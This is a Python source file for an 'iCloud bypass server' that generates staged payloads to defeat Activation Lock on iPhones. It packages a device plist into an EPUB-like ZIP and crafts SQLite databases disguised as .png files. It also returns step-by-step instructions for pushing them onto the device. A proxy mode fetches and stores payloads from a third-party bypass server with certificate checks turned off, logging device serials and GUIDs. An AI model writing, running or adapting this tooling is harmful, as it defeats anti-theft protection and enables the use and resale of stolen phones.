#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================
AREPATOOL iCLOUD BYPASS SERVER (Python Version)
=====================================================

Genera payloads personalizados para el bypass de iCloud
Compatible con iOS 18.x - 26.x (iPhone XR - iPhone 18)

Endpoints:
  GET  /                     → Status del servidor
  GET  /generate             → Genera payloads
  GET  /models               → Lista modelos soportados

@author ArepaTool Team
@version 1.0.0
"""

import os
import sys
import json
import sqlite3
import secrets
import zipfile
import tempfile
import shutil
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path

# =====================================================
# CONFIGURATION
# =====================================================

HOST = '0.0.0.0'
PORT = 8090
BASE_DIR = Path(__file__).parent / 'public'
MAKER_DIR = BASE_DIR / 'Maker'

# =====================================================
# UTILITY FUNCTIONS
# =====================================================

def generate_random_name(length=16):
    """Generate random hex string for directory names"""
    return secrets.token_hex(length // 2)

def log_debug(msg, level='INFO'):
    """Log message with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] [{level}] {msg}")

def read_sql_dump(filepath):
    """Read SQL dump from file"""
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"SQL dump file not found: {filepath}")
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return f.read()

def create_sqlite_from_dump(sql_dump, output_file):
    """Create SQLite database from SQL dump"""
    # Remove unistr() functions (Oracle compatibility)
    def convert_unistr(match):
        s = match.group(1)
        # Convert \XXXX to unicode
        def hex_to_char(m):
            try:
                return chr(int(m.group(1), 16))
            except:
                return ''
        s = re.sub(r'\\([0-9A-Fa-f]{4})', hex_to_char, s)
        return f"'{s}'"
    
    sql_dump = re.sub(r"unistr\s*\(\s*['\"]([^'\"]*)['\"]\\s*\)", convert_unistr, sql_dump, flags=re.IGNORECASE)
    sql_dump = re.sub(r"unistr\s*\(\s*(['\"][^'\"]*['\"])\s*\)", r"\1", sql_dump, flags=re.IGNORECASE)
    
    # Create database
    conn = sqlite3.connect(output_file)
    cursor = conn.cursor()
    
    statements = sql_dump.split(';')
    for statement in statements:
        statement = statement.strip()
        if statement and len(statement) > 5:
            try:
                cursor.execute(statement + ';')
            except sqlite3.Error:
                pass  # Ignore errors for unsupported statements
    
    conn.commit()
    conn.close()
    return True

def cleanup_old_files(base_path, max_age_minutes=60):
    """Remove old payload directories"""
    import time
    cutoff = time.time() - (max_age_minutes * 60)
    
    for dir_name in ['firststp', '2ndd', 'last']:
        dir_path = base_path / dir_name
        if not dir_path.exists():
            continue
        
        for item in dir_path.iterdir():
            if item.is_dir() and item.stat().st_mtime < cutoff:
                try:
                    shutil.rmtree(item)
                except:
                    pass

# =====================================================
# HTTP REQUEST HANDLER
# =====================================================

class BypassHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        """Custom log format"""
        log_debug(f"{self.address_string()} - {args[0]}")
    
    def send_json(self, data, status=200):
        """Send JSON response"""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2, ensure_ascii=False).encode('utf-8'))
    
    def send_file(self, filepath):
        """Send file as response"""
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', len(content))
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_json({'success': False, 'error': 'File not found'}, 404)
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests"""
        parsed = urlparse(self.path)
        path = parsed.path.rstrip('/')
        params = parse_qs(parsed.query)
        
        # Route: Status
        if path == '' or path == '/':
            self.send_json({
                'success': True,
                'service': 'ArepaTool iCloud Bypass Server',
                'version': '1.0.0',
                'status': 'online',
                'endpoints': {
                    'GET /': 'Server status',
                    'GET /generate?prd=X&guid=Y&sn=Z': 'Generate bypass payloads',
                    'GET /models': 'List supported models'
                }
            })
            return
        
        # Route: List models
        if path == '/models':
            models = []
            if MAKER_DIR.exists():
                for item in MAKER_DIR.iterdir():
                    if item.is_dir():
                        models.append(item.name)
            models.sort()
            self.send_json({
                'success': True,
                'count': len(models),
                'models': models
            })
            return
        
        # Route: Generate payloads (original mode)
        if path == '/generate':
            self.handle_generate(params)
            return
        
        # Route: PROXY MODE - Forward to original RustA12+ server with caching
        if path == '/rust.php':
            self.handle_proxy_request(params)
            return
        
        # Route: Serve static files (payloads)
        for dir_name in ['firststp', '2ndd', 'last']:
            if path.startswith(f'/{dir_name}/'):
                file_path = BASE_DIR / path[1:]  # Remove leading /
                if file_path.exists() and file_path.is_file():
                    self.send_file(file_path)
                    return
        
        # 404
        self.send_json({
            'success': False,
            'error': 'Endpoint not found',
            'available_endpoints': ['/', '/generate', '/models']
        }, 404)
    
    def handle_generate(self, params):
        """Generate bypass payloads"""
        try:
            # Cleanup old files occasionally
            if secrets.randbelow(10) == 0:
                cleanup_old_files(BASE_DIR)
            
            # Get parameters
            prd = params.get('prd', [''])[0]
            guid = params.get('guid', [''])[0]
            sn = params.get('sn', [''])[0]
            ios_version = params.get('ios_version', [''])[0]  # Optional iOS version
            
            if not prd or not guid or not sn:
                self.send_json({
                    'success': False,
                    'error': 'Missing required parameters: prd, guid, sn'
                }, 400)
                return
            
            # Validate GUID format
            guid_pattern = re.compile(r'^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$', re.IGNORECASE)
            if not guid_pattern.match(guid):
                self.send_json({
                    'success': False,
                    'error': 'Invalid GUID format. Expected: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX'
                }, 400)
                return
            
            prd_formatted = prd.replace(',', '-')
            guid = guid.upper()
            
            log_debug(f"Generating payload for: prd={prd_formatted}, guid={guid}, sn={sn}, ios={ios_version or 'any'}")
            
            # Find plist for device model
            plist_path = MAKER_DIR / prd_formatted / 'com.apple.MobileGestalt.plist'
            
            if not plist_path.exists():
                self.send_json({
                    'success': False,
                    'error': f'Device model not supported: {prd_formatted}',
                    'hint': 'Use GET /models to see supported devices'
                }, 404)
                return
            
            # Determine base URL (detect HTTPS from Cloudflare)
            host = self.headers.get('Host', f'localhost:{PORT}')
            proto = self.headers.get('X-Forwarded-Proto', 'http')
            if 'arepatool.com' in host:
                proto = 'https'  # Always use HTTPS for public domain
            base_url = f'{proto}://{host}'
            
            # =====================================================
            # STAGE 1: Create fixedfile (EPUB-like ZIP)
            # =====================================================
            
            random_name1 = generate_random_name()
            stage1_dir = BASE_DIR / 'firststp' / random_name1
            stage1_dir.mkdir(parents=True, exist_ok=True)
            
            zip_path = stage1_dir / 'temp.zip'
            fixed_file_path = stage1_dir / 'fixedfile'
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                # Add mimetype (stored, not compressed for EPUB compliance)
                zf.writestr('Caches/mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
                # Add plist
                zf.write(plist_path, 'Caches/com.apple.MobileGestalt.plist')
            
            # Rename to fixedfile
            zip_path.rename(fixed_file_path)
            
            stage1_url = f'{base_url}/firststp/{random_name1}/fixedfile'
            log_debug(f"Stage 1 created: {stage1_url}")
            
            # =====================================================
            # STAGE 2: Create BLDatabaseManager.sqlite
            # =====================================================
            
            bl_dump = read_sql_dump(BASE_DIR / 'BLDatabaseManager.png')
            bl_dump = bl_dump.replace('KEYOOOOOO', stage1_url)
            
            random_name2 = generate_random_name()
            stage2_dir = BASE_DIR / '2ndd' / random_name2
            stage2_dir.mkdir(parents=True, exist_ok=True)
            
            bl_sqlite_path = stage2_dir / 'BLDatabaseManager.sqlite'
            create_sqlite_from_dump(bl_dump, str(bl_sqlite_path))
            
            # Rename with obfuscated name
            stage2_final_path = stage2_dir / 'belliloveu.png'
            bl_sqlite_path.rename(stage2_final_path)
            
            stage2_url = f'{base_url}/2ndd/{random_name2}/belliloveu.png'
            log_debug(f"Stage 2 created: {stage2_url}")
            
            # =====================================================
            # STAGE 3: Create downloads.28.sqlitedb
            # =====================================================
            
            dl_dump = read_sql_dump(BASE_DIR / 'downloads.28.png')
            dl_dump = dl_dump.replace('https://google.com', stage2_url)
            dl_dump = dl_dump.replace('GOODKEY', guid)
            
            random_name3 = generate_random_name()
            stage3_dir = BASE_DIR / 'last' / random_name3
            stage3_dir.mkdir(parents=True, exist_ok=True)
            
            final_db_path = stage3_dir / 'downloads.sqlitedb'
            create_sqlite_from_dump(dl_dump, str(final_db_path))
            
            # Rename with obfuscated name
            stage3_final_path = stage3_dir / 'applefixed.png'
            final_db_path.rename(stage3_final_path)
            
            stage3_url = f'{base_url}/last/{random_name3}/applefixed.png'
            log_debug(f"Stage 3 created: {stage3_url}")
            
            # =====================================================
            # SUCCESS RESPONSE
            # =====================================================
            
            self.send_json({
                'success': True,
                'message': 'Bypass payloads generated successfully',
                'device': {
                    'model': prd_formatted,
                    'serial': sn,
                    'guid': guid
                },
                'links': {
                    'step1_fixedfile': stage1_url,
                    'step2_bldatabase': stage2_url,
                    'step3_final': stage3_url
                },
                'instructions': {
                    '1': 'Download step3_final and push to /Downloads/downloads.28.sqlitedb',
                    '2': 'Reboot device and wait for iTunesMetadata.plist',
                    '3': 'Copy /iTunes_Control/iTunes/iTunesMetadata.plist to /Books/',
                    '4': 'Reboot again and wait for activation'
                }
            })
            
            log_debug(f"Payload generation complete for {prd_formatted}")
            
        except Exception as e:
            log_debug(f"Error: {str(e)}", 'ERROR')
            self.send_json({
                'success': False,
                'error': str(e)
            }, 500)

    def handle_proxy_request(self, params):
        """
        PROXY MODE: Forward request to original RustA12+ server
        Also downloads and caches the actual payload files for analysis
        """
        import urllib.request
        import urllib.error
        import ssl
        
        ORIGINAL_SERVER = "https://codex-r1nderpest-a12.ru"
        CACHE_DIR = BASE_DIR / 'cache'
        ANALYSIS_DIR = BASE_DIR / 'analysis'  # For studying payloads
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
        ANALYSIS_DIR.mkdir(parents=True, exist_ok=True)
        
        try:
            # Get parameters
            prd = params.get('prd', [''])[0]
            guid = params.get('guid', [''])[0]
            sn = params.get('sn', [''])[0]
            ios_version = params.get('ios_version', [''])[0]
            
            if not prd or not guid or not sn:
                self.send_json({
                    'success': False,
                    'error': 'Missing required parameters: prd, guid, sn'
                }, 400)
                return
            
            # Check cache first (by GUID since it's unique per device)
            cache_key = guid.upper()
            cache_file = CACHE_DIR / f"{cache_key}.json"
            
            if cache_file.exists():
                try:
                    with open(cache_file, 'r') as f:
                        cached_data = json.load(f)
                    log_debug(f"[PROXY] Cache HIT for GUID {cache_key[:8]}...")
                    self.send_json(cached_data)
                    return
                except:
                    pass  # Cache corrupted, fetch fresh
            
            log_debug(f"[PROXY] Forwarding request to original server for {prd}")
            
            # Build URL for original server
            original_url = f"{ORIGINAL_SERVER}/rust.php?prd={prd}&guid={guid}&sn={sn}"
            if ios_version:
                original_url += f"&ios_version={ios_version}"
            
            log_debug(f"[PROXY] URL: {original_url}")
            
            # Make request to original server
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            req = urllib.request.Request(original_url, headers={
                'User-Agent': 'ArepaTool/2.0 BypassProxy'
            })
            
            with urllib.request.urlopen(req, timeout=30, context=ctx) as response:
                data = response.read().decode('utf-8')
            
            log_debug(f"[PROXY] Got response from original server ({len(data)} bytes)")
            
            # Parse response
            try:
                result = json.loads(data)
            except json.JSONDecodeError:
                log_debug(f"[PROXY] Invalid JSON response: {data[:200]}", 'ERROR')
                self.send_json({
                    'success': False,
                    'error': 'Original server returned invalid JSON'
                }, 502)
                return
            
            # Save JSON to cache
            try:
                with open(cache_file, 'w') as f:
                    json.dump(result, f, indent=2)
                log_debug(f"[PROXY] Cached JSON for GUID {cache_key[:8]}...")
            except Exception as e:
                log_debug(f"[PROXY] Failed to cache JSON: {e}", 'WARN')
            
            # =====================================================
            # DOWNLOAD AND SAVE PAYLOADS FOR ANALYSIS
            # =====================================================
            
            # Create device-specific analysis folder
            device_dir = ANALYSIS_DIR / f"{prd.replace(',', '-')}_{cache_key[:8]}"
            device_dir.mkdir(parents=True, exist_ok=True)
            
            # Save the JSON response
            with open(device_dir / 'response.json', 'w') as f:
                json.dump(result, f, indent=2)
            
            # Try to download the payload files
            urls_to_download = []
            if result.get('success') and result.get('links'):
                links = result['links']
                if links.get('step1_fixedfile'):
                    urls_to_download.append(('step1_fixedfile.bin', links['step1_fixedfile']))
                if links.get('step2_bldatabase'):
                    urls_to_download.append(('step2_bldatabase.bin', links['step2_bldatabase']))
                if links.get('step3_final'):
                    urls_to_download.append(('step3_downloads.28.sqlitedb', links['step3_final']))
            
            for filename, url in urls_to_download:
                try:
                    log_debug(f"[ANALYSIS] Downloading {filename}...")
                    req = urllib.request.Request(url, headers={
                        'User-Agent': 'ArepaTool/2.0 BypassProxy'
                    })
                    with urllib.request.urlopen(req, timeout=60, context=ctx) as resp:
                        payload_data = resp.read()
                    
                    filepath = device_dir / filename
                    with open(filepath, 'wb') as f:
                        f.write(payload_data)
                    
                    log_debug(f"[ANALYSIS] Saved {filename} ({len(payload_data)} bytes)")
                except Exception as e:
                    log_debug(f"[ANALYSIS] Failed to download {filename}: {e}", 'WARN')
            
            # Create analysis notes file
            with open(device_dir / 'INFO.txt', 'w') as f:
                f.write(f"Device: {prd}\n")
                f.write(f"GUID: {guid}\n")
                f.write(f"Serial: {sn}\n")
                f.write(f"iOS: {ios_version or 'unknown'}\n")
                f.write(f"Captured: {datetime.now().isoformat()}\n")
                f.write(f"\nOriginal URL: {original_url}\n")
            
            log_debug(f"[ANALYSIS] Saved to: {device_dir}")
            
            # Return response to client
            self.send_json(result)
            
        except urllib.error.URLError as e:
            log_debug(f"[PROXY] Original server error: {e}", 'ERROR')
            self.send_json({
                'success': False,
                'error': f'Original server unavailable: {str(e)}'
            }, 502)
        except Exception as e:
            log_debug(f"[PROXY] Proxy error: {e}", 'ERROR')
            self.send_json({
                'success': False,
                'error': str(e)
            }, 500)

# =====================================================
# MAIN
# =====================================================

def main():
    # Ensure directories exist
    for dir_name in ['firststp', '2ndd', 'last']:
        (BASE_DIR / dir_name).mkdir(parents=True, exist_ok=True)
    
    # Verify Maker directory
    if not MAKER_DIR.exists():
        print(f"[ERROR] Maker directory not found: {MAKER_DIR}")
        print("[ERROR] Please ensure device plists are in place")
        sys.exit(1)
    
    # Count models
    model_count = sum(1 for x in MAKER_DIR.iterdir() if x.is_dir())
    
    print()
    print("=" * 60)
    print("   AREPATOOL iCLOUD BYPASS SERVER")
    print("=" * 60)
    print()
    print(f"  Version:     1.0.0")
    print(f"  Models:      {model_count} devices supported")
    print(f"  Port:        {PORT}")
    print()
    print("  Endpoints:")
    print(f"    Status:    http://localhost:{PORT}/")
    print(f"    Generate:  http://localhost:{PORT}/generate?prd=X&guid=Y&sn=Z")
    print(f"    Models:    http://localhost:{PORT}/models")
    print()
    print("=" * 60)
    print()
    print("  Press Ctrl+C to stop the server")
    print()
    
    server = HTTPServer((HOST, PORT), BypassHandler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[INFO] Server stopped")
        server.shutdown()

if __name__ == '__main__':
    main()
